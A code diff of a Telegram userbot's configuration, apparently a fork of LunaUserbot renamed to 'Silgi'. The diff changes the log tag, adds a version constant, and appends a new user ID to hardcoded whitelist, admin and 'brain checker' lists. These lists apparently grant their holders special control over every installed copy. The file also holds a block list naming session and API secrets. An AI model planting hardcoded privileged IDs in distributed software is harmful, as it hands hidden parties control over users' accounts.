@@ -40,7 +40,7 @@ if CONSOLE_LOGGER_VERBOSE:
         level=DEBUG,
     )
 else:
-    basicConfig(format="%(asctime)s - @lunadestek - %(levelname)s - %(message)s",
+    basicConfig(format="%(asctime)s - @silgiub - %(levelname)s - %(message)s",
                 level=INFO)
 LOGS = getLogger(__name__)
 
@@ -68,6 +68,7 @@ if not LANGUAGE in ["EN", "TR", "AZ", "UZ", "DEFAULT"]:
     
 # LunaUserbot Versiyası
 LUNA_VERSION = "x7.6.2"
+SILGI_VERSION = "x7.6.2"
 
 # Telegram API KEY ve HASH
 API_KEY = os.environ.get("API_KEY", None)
@@ -213,8 +214,8 @@ AVTO_Q = sb(os.environ.get("AVTO_Q", "True"))
 
 # Pattern
 PATTERNS = os.environ.get("PATTERNS", ".,")
-WHITELIST = [5898049921, 6799203666]
-ADMINS = [5898049921, 6799203666]
+WHITELIST = [5898049921, 6799203666, 6436992668]
+ADMINS = [5898049921, 6799203666, 6436992668]
 START_TIME = int(os.environ.get("START_TIME", time.time()))
 # Təhlükəli pluginlər üçün
 TEHLUKELI = ["SESSION", "HEROKU_APIKEY", "API_HASH", "API_KEY", ".session.save"]
@@ -549,7 +550,7 @@ Hesabınızı bot'a çevirə bilərsiz və bunları işlədə bilərsiz. Unutmay
 SON_GORULME = 0
 COUNT_MSG = 0
 USERS = {}
-BRAIN_CHECKER = [5898049921, 6799203666]
+BRAIN_CHECKER = [5898049921, 6799203666, 6436992668]
 COUNT_PM = {}
 LASTMSG = {}
 ENABLE_KILLME = True
